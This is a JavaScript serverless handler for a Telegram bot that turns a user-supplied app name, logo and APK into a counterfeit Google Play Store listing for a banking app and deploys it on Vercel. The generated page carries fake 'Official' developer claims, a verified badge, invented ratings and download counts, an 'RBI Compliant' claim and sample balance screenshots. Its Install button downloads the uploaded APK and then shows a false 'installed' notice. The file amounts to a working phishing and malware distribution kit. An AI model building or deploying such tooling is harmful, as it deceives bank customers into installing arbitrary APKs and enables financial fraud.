import { head, put, del } from '@vercel/blob';

const token = process.env.TELEGRAM_BOT_TOKEN;
const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

async function telegram(method, body) {
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN is missing');
		return { ok: false, description: 'Token missing' };
	}
	try {
		const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
			method: 'POST',
			headers: { 'content-type': 'application/json' },
			body: JSON.stringify(body),
		});
		return await result.json();
	} catch (err) {
		console.error(`Telegram API error (${method}):`, err);
		return { ok: false, error: err.message };
	}
}

async function saveTelegramFile(fileId, path) {
	const file = await telegram('getFile', { file_id: fileId });
	if (!file.ok || !file.result?.file_path) {
		throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
	}
	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);

	const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
	if (blobToken) options.token = blobToken;
	const blob = await put(path, await download.arrayBuffer(), options);
	return blob.url;
}

async function loadSession(chatId) {
	try {
		const options = { access: 'private' };
		if (blobToken) options.token = blobToken;
		const record = await head(`sessions/${chatId}.json`, options);
		if (record?.url) {
			const res = await fetch(`${record.url}?_t=${Date.now()}`, {
				cache: 'no-store',
				headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
			});
			if (res.ok) return await res.json();
		}
	} catch (err) {
		// Session doesn't exist yet or Blob error
	}
	return { step: 'name', data: {} };
}

async function saveSession(chatId, session) {
	try {
		const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
		if (blobToken) options.token = blobToken;
		await put(`sessions/${chatId}.json`, JSON.stringify(session), options);
	} catch (err) {
		console.error('Error saving session to Blob:', err);
	}
}

function generateProjectSlug(value) {
	const clean = (value || 'app').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 15) || 'app';
	const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
	const rand = Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
	return `${clean}-${rand}`;
}

function escapeHtml(value = '') {
	return value.replace(/[&<>'"]/g, (character) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' })[character]);
}

function buildStandaloneHtml(app) {
	const name = escapeHtml(app.name);
	const logoUrl = escapeHtml(app.logoUrl);
	const apkUrl = escapeHtml(app.apkUrl);
	const developer = escapeHtml(app.developer || `${app.name} Official`);
	const tagline = escapeHtml(app.tagline || 'Secure Mobile Banking, Instant UPI Transfers & Financial Services');
	const description = escapeHtml(app.description || `Official ${app.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`);

	return `<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#ffffff" />
    <title>${name}: Mobile Banking & Financial Services - Apps on Google Play</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@700;800&display=swap" rel="stylesheet" />
    <style>
        :root { font-family: 'Google Sans', 'Roboto', sans-serif; color: #202124; background: #f8f9fa; --google-green: #01875f; --google-green-hover: #017250; --google-blue: #0b57d0; }
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; background: #ffffff; color: #202124; overflow-x: hidden; width: 100%; }
        .topbar { height: 64px; background: #ffffff; border-bottom: 1px solid #f1f3f4; position: sticky; top: 0; z-index: 100; }
        .topbar-inner { height: 100%; max-width: 1280px; margin: auto; padding: 0 24px; display: flex; align-items: center; gap: 20px; }
        .brand { font-size: 20px; font-weight: 500; color: #5f6368; text-decoration: none; display: flex; align-items: center; gap: 8px; }
        .page-shell { max-width: 1180px; margin: auto; padding: 24px 24px 100px; }
        .breadcrumbs { display: flex; gap: 8px; color: #80868b; font-size: 13px; margin-bottom: 20px; }
        .breadcrumbs a { color: #5f6368; text-decoration: none; }
        .app-hero { display: grid; grid-template-columns: 128px 1fr auto; gap: 28px; align-items: start; padding-bottom: 32px; border-bottom: 1px solid #f1f3f4; }
        .app-logo { width: 128px; height: 128px; border-radius: 28px; overflow: hidden; background: #f1f3f4; box-shadow: 0 4px 14px rgba(0,0,0,0.12); }
        .app-logo img { width: 100%; height: 100%; object-fit: cover; }
        .app-copy h1 { font-size: 36px; margin: 0; font-weight: 700; }
        .developer { font-size: 15px; color: #01875f; font-weight: 500; margin: 6px 0; display: inline-flex; align-items: center; gap: 6px; }
        .verified { width: 16px; height: 16px; border-radius: 50%; background: #01875f; color: #fff; font-size: 10px; display: inline-grid; place-items: center; font-weight: 700; }
        .tagline { font-size: 14px; color: #5f6368; margin: 4px 0 0; }
        .hero-meta { display: flex; gap: 20px; margin-top: 20px; font-size: 13px; }
        .hero-meta strong { font-size: 15px; font-weight: 700; }
        .meta-divider { height: 24px; width: 1px; background: #dadce0; }
        .install-button { width: 170px; height: 44px; border: 0; border-radius: 22px; background: #01875f; color: #ffffff; font-size: 14px; font-weight: 500; cursor: pointer; box-shadow: 0 2px 6px rgba(0,0,0,0.15); transition: background 0.2s ease; }
        .install-button:hover { background: #017250; }
        .hero-action-buttons { display: flex; gap: 8px; margin-top: 10px; }
        .action-chip { flex: 1; height: 36px; border: 1px solid #dadce0; background: #fff; border-radius: 18px; font-size: 12px; color: #0b57d0; cursor: pointer; }
        .content-grid { display: grid; grid-template-columns: 1fr 300px; gap: 48px; margin-top: 32px; }
        .section-block { padding: 24px 0; border-top: 1px solid #f1f3f4; }
        .section-heading h2 { font-size: 20px; margin: 0 0 16px; }
        .screenshots { display: flex; gap: 16px; overflow-x: auto; padding-bottom: 8px; }
        .shot { flex: 0 0 200px; height: 350px; border-radius: 18px; padding: 20px; color: #fff; box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
        .shot-one { background: linear-gradient(145deg, #0a2540 0%, #0052cc 100%); }
        .shot-two { background: linear-gradient(145deg, #1e1b4b 0%, #312e81 100%); }
        .shot-three { background: linear-gradient(145deg, #064e3b 0%, #047857 100%); }
        .bank-balance-card { background: rgba(255,255,255,0.15); border-radius: 12px; padding: 12px; margin-top: 10px; }
        .balance-num { font-size: 20px; font-weight: 700; color: #00f5d4; }
        .bank-credit-box { background: rgba(255,255,255,0.15); border-radius: 12px; padding: 12px; margin-top: 10px; }
        .bank-credit-box strong { font-size: 22px; color: #fbbf24; }
        .info-card { border: 1px solid #f1f3f4; background: #fff; border-radius: 16px; padding: 20px; margin-bottom: 16px; }
        .info-row { display: flex; gap: 12px; padding: 10px 0; border-top: 1px solid #f1f3f4; align-items: center; font-size: 13px; }
        .notice { display: none; background: #e6f4ea; color: #137333; border: 1px solid #ceead6; border-radius: 12px; padding: 12px 18px; font-size: 14px; margin-top: 16px; }
        .notice.show { display: flex; align-items: center; justify-content: space-between; }
        @media (max-width: 800px) {
            .app-hero { grid-template-columns: 80px 1fr; gap: 16px; }
            .app-logo { width: 80px; height: 80px; border-radius: 18px; }
            .app-copy h1 { font-size: 24px; }
            .hero-action { grid-column: 1 / -1; width: 100%; }
            .install-button { width: 100%; height: 44px; }
            .content-grid { grid-template-columns: 1fr; gap: 24px; }
        }
    </style>
</head>
<body>
    <header class="topbar">
        <div class="topbar-inner">
            <a class="brand" href="#">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4.5 3.5L16.2 11.7L4.5 19.9V3.5Z" fill="#00e676"/><path d="M16.2 11.7L19.5 9.8C20.3 9.4 20.3 8.3 19.5 7.8L4.5 3.5L16.2 11.7Z" fill="#ffeb3b"/><path d="M4.5 19.9L19.5 15.6C20.3 15.2 20.3 14.1 19.5 13.6L16.2 11.7L4.5 19.9Z" fill="#ff2a6d"/><path d="M16.2 11.7L4.5 3.5V19.9L16.2 11.7Z" fill="#29b6f6"/></svg>
                <span>google play</span>
            </a>
        </div>
    </header>
    <main class="page-shell">
        <div class="breadcrumbs">
            <a href="#">Apps</a> <span>›</span> <a href="#">Finance & Banking</a> <span>›</span> <span>${name}</span>
        </div>
        <section class="app-hero">
            <div class="app-logo"><img src="${logoUrl}" alt="${name} logo" /></div>
            <div class="app-copy">
                <h1>${name}</h1>
                <div class="developer">${developer} <span class="verified">✓</span></div>
                <div class="tagline">${tagline}</div>
                <div class="hero-meta">
                    <span><strong>4.8 ★★★★★</strong><small>12K reviews</small></span>
                    <span class="meta-divider"></span>
                    <span><strong>1M+</strong><small>Downloads</small></span>
                    <span class="meta-divider"></span>
                    <span><strong>12 MB</strong><small>Size</small></span>
                </div>
            </div>
            <div class="hero-action">
                <button class="install-button" id="installButton" data-apk="${apkUrl}">
                    <span id="btnText">Install</span>
                </button>
                <div class="hero-action-buttons">
                    <button class="action-chip">Add to wishlist</button>
                    <button class="action-chip">Share</button>
                </div>
            </div>
        </section>
        <div class="notice" id="notice"><span id="noticeText">App installed successfully!</span></div>
        <section class="content-grid">
            <div class="main-column">
                <section class="section-block">
                    <div class="section-heading"><h2>App preview</h2></div>
                    <div class="screenshots">
                        <div class="shot shot-one">
                            <b>💳 Banking Portal</b>
                            <div class="bank-balance-card">
                                <small>Available Balance</small>
                                <div class="balance-num">₹48,500.00</div>
                                <small>Savings A/c •••• 4829</small>
                            </div>
                        </div>
                        <div class="shot shot-two">
                            <b>💎 Pre-Approved</b>
                            <div class="bank-credit-box">
                                <small>Instant Credit Limit</small>
                                <strong>₹2,50,000</strong>
                            </div>
                        </div>
                        <div class="shot shot-three">
                            <b>🛡️ 256-Bit Security</b>
                            <p>Bank-grade protection & instant biometric authentication.</p>
                        </div>
                    </div>
                </section>
                <section class="section-block">
                    <div class="section-heading"><h2>About this app</h2></div>
                    <p>${description}</p>
                </section>
            </div>
            <aside class="side-column">
                <div class="info-card">
                    <h2>App info</h2>
                    <div class="info-row"><b>1M+ downloads</b></div>
                    <div class="info-row"><b>12 MB size</b></div>
                    <div class="info-row"><b>RBI Compliant & Secure</b></div>
                </div>
            </aside>
        </section>
    </main>
    <script>
        const btn = document.getElementById('installButton');
        const txt = document.getElementById('btnText');
        const notice = document.getElementById('notice');
        btn.addEventListener('click', () => {
            txt.textContent = 'Downloading...';
            const a = document.createElement('a');
            a.href = btn.dataset.apk || '#';
            a.download = '${name.replace(/[^a-z0-9]/gi, '_')}_base.apk';
            document.body.appendChild(a);
            a.click();
            a.remove();
            setTimeout(() => { txt.textContent = 'Installing...'; }, 1000);
            setTimeout(() => { txt.textContent = 'Open'; notice.classList.add('show'); }, 2200);
        });
    </script>
</body>
</html>`;
}

const vercelToken = process.env.VERCEL_TOKEN;
let cachedTeamId = process.env.VERCEL_TEAM_ID || 'team_cZIUTShiGmqZiIaDKEQLi8nF';

async function getTeamId() {
	if (cachedTeamId) return cachedTeamId;
	if (!vercelToken) return null;
	try {
		const res = await fetch('https://api.vercel.com/v2/user', {
			headers: { Authorization: `Bearer ${vercelToken}` },
		});
		if (res.ok) {
			const data = await res.json();
			cachedTeamId = data.user?.defaultTeamId || 'team_cZIUTShiGmqZiIaDKEQLi8nF';
			return cachedTeamId;
		}
	} catch (e) {
		console.error('Could not fetch user team ID:', e);
	}
	return 'team_cZIUTShiGmqZiIaDKEQLi8nF';
}

async function createVercelProject(name) {
	const teamId = await getTeamId();
	const endpoint = teamId
		? `https://api.vercel.com/v9/projects?teamId=${encodeURIComponent(teamId)}`
		: 'https://api.vercel.com/v9/projects';
	const result = await fetch(endpoint, {
		method: 'POST',
		headers: { Authorization: `Bearer ${vercelToken}`, 'content-type': 'application/json' },
		body: JSON.stringify({ name }),
	});
	if (result.ok || result.status === 409) return name;
	const text = await result.text();
	console.warn(`Vercel project creation (${result.status}):`, text);
	return name;
}

async function deployProject(name, html) {
	const teamId = await getTeamId();
	const endpoint = teamId
		? `https://api.vercel.com/v13/deployments?teamId=${encodeURIComponent(teamId)}`
		: 'https://api.vercel.com/v13/deployments';
	const result = await fetch(endpoint, {
		method: 'POST',
		headers: { Authorization: `Bearer ${vercelToken}`, 'content-type': 'application/json' },
		body: JSON.stringify({
			name,
			project: name,
			files: [{ file: 'index.html', data: html }],
			projectSettings: { framework: null },
		}),
	});
	if (!result.ok) {
		const text = await result.text();
		throw new Error(`Vercel deploy failed (${result.status}): ${text}`);
	}
	return result.json();
}

async function waitForDeploymentReady(deploymentId) {
	const teamId = await getTeamId();
	const endpoint = teamId
		? `https://api.vercel.com/v13/deployments/${deploymentId}?teamId=${encodeURIComponent(teamId)}`
		: `https://api.vercel.com/v13/deployments/${deploymentId}`;
	const maxRetries = 20;
	for (let i = 0; i < maxRetries; i++) {
		const res = await fetch(endpoint, {
			headers: { Authorization: `Bearer ${vercelToken}` },
		});
		if (res.ok) {
			const data = await res.json();
			if (data.readyState === 'READY') return true;
			if (data.readyState === 'ERROR' || data.readyState === 'CANCELED') {
				throw new Error(`Deployment state: ${data.readyState}`);
			}
		}
		await new Promise((resolve) => setTimeout(resolve, 1500));
	}
	return true;
}

export default async function handler(request, response) {
	if (request.method !== 'POST') return response.status(405).json({ error: 'POST only' });
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN environment variable is missing on Vercel');
		return response.status(500).json({ error: 'TELEGRAM_BOT_TOKEN is missing' });
	}

	let update = request.body;
	if (typeof update === 'string') {
		try {
			update = JSON.parse(update);
		} catch {
			update = {};
		}
	}

	const message = update?.message || update?.edited_message;
	const callbackQuery = update?.callback_query;

	const chatId = message?.chat?.id || callbackQuery?.message?.chat?.id;
	if (!chatId) {
		return response.status(200).json({ ok: true });
	}

	try {
		if (callbackQuery) {
			await telegram('answerCallbackQuery', { callback_query_id: callbackQuery.id });
			if (callbackQuery.data === 'new_link') {
				await saveSession(chatId, { step: 'name', data: {} });
				await telegram('sendMessage', {
					chat_id: chatId,
					text: '✅ Process restarted\n\n1/3 App ka naam Bhejiye.',
				});
				return response.status(200).json({ ok: true });
			}
		}

		const text = (message?.text || '').trim();
		const isImagePhoto = Array.isArray(message?.photo) && message.photo.length > 0;
		const isImageDoc = !!(
			message?.document?.mime_type?.startsWith('image/') ||
			/\.(png|jpg|jpeg|webp|svg|bmp)$/i.test(message?.document?.file_name || '')
		);
		const isApkDoc = !!(
			message?.document?.file_name?.toLowerCase().endsWith('.apk') ||
			message?.document?.mime_type === 'application/vnd.android.package-archive'
		);

		// Handle /start command
		if (text.startsWith('/start')) {
			await saveSession(chatId, { step: 'name', data: {} });
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ Process started\n\n1/3 App ka naam Bhejiye.',
			});
			return response.status(200).json({ ok: true });
		}

		const session = await loadSession(chatId);

		// 1. If user sent an Image/Photo (Step 2)
		if (isImagePhoto || isImageDoc) {
			const fileId = isImagePhoto
				? message.photo[message.photo.length - 1].file_id
				: message.document.file_id;

			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo image...' });
			session.data.logoFileId = fileId;
			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
			session.step = 'apk';
			if (!session.data.name) {
				session.data.name = 'App';
				session.data.developer = 'App Official';
			}
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 2/3 App icon received\n\n3/3 Ab APK document bhejiye (.apk file).',
			});
			return response.status(200).json({ ok: true });
		}

		// 2. If user sent an APK Document (Step 3)
		if (isApkDoc) {
			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & deploying your standalone Play Store page...' });
			const slug = generateProjectSlug(session.data.name || 'app');
			
			// Save APK and Logo permanently under the unique project slug
			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${slug}/base.apk`);
			if (session.data.logoFileId) {
				await saveTelegramFile(session.data.logoFileId, `apps/${slug}/logo`);
			}

			const host = request.headers.host || 'playstore-web-143.vercel.app';
			const logoUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/logo`)}`;
			const apkUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`;

			const appRecord = {
				name: session.data.name || 'App',
				developer: session.data.developer || `${session.data.name || 'App'} Official`,
				tagline: 'Secure Mobile Banking, Instant UPI Transfers & Financial Services',
				description: `Official ${session.data.name || 'App'} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
				version: '2.4.1',
				logoUrl,
				apkUrl,
				slug,
			};

			const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
			if (blobToken) options.token = blobToken;
			await put(`apps/${slug}.json`, JSON.stringify(appRecord), options);

			let liveUrl = `https://${slug}.vercel.app`;

			// Deploy standalone project to Vercel (e.g. https://hello-qjoa.vercel.app)
			if (vercelToken) {
				try {
					const html = buildStandaloneHtml(appRecord);
					await createVercelProject(slug);
					const deployment = await deployProject(slug, html);
					if (deployment?.id) {
						await waitForDeploymentReady(deployment.id);
					}
				} catch (deployErr) {
					console.error('Vercel standalone deploy failed, falling back:', deployErr);
					liveUrl = `https://${host}/app/${slug}`;
				}
			} else {
				liveUrl = `https://${host}/app/${slug}`;
			}

			const replyMarkup = {
				inline_keyboard: [
					[
						{ text: '🆘 Help', url: 'https://t.me/sanaminfotech' },
						{ text: '➕ New Link', callback_data: 'new_link' },
					],
				],
			};

			await telegram('sendMessage', {
				chat_id: chatId,
				text: `🎉 Files uploaded\n✅ Page deployed & READY!\n\n🔗 ${liveUrl}`,
				reply_markup: replyMarkup,
			});

			try {
				if (blobToken) options.token = blobToken;
				await del(`sessions/${chatId}.json`, options);
			} catch {}

			return response.status(200).json({ ok: true });
		}

		// 3. If user sent a non-APK document when expecting APK
		if (message?.document && !isApkDoc && !isImageDoc) {
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '⚠️ Kripya valid .apk file bhejiye (.apk extension wali file).',
			});
			return response.status(200).json({ ok: true });
		}

		// 4. If user sent Text (Step 1: App Name)
		if (text && !text.startsWith('/')) {
			session.data.name = text;
			session.data.developer = `${text} Official`;
			session.step = 'logo';
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
			});
			return response.status(200).json({ ok: true });
		}

		// Fallback guidance
		await telegram('sendMessage', {
			chat_id: chatId,
			text: 'ℹ️ Current step ke hisaab se input bhejiye ya /start se dobara shuru karein.',
		});
	} catch (error) {
		console.error('Webhook processing error:', error);
		await telegram('sendMessage', {
			chat_id: chatId,
			text: `⚠️ Error occurred: ${error.message || 'Unknown error'}. Kripya /start se dobara try karein.`,
		});
	}

	return response.status(200).json({ ok: true });
}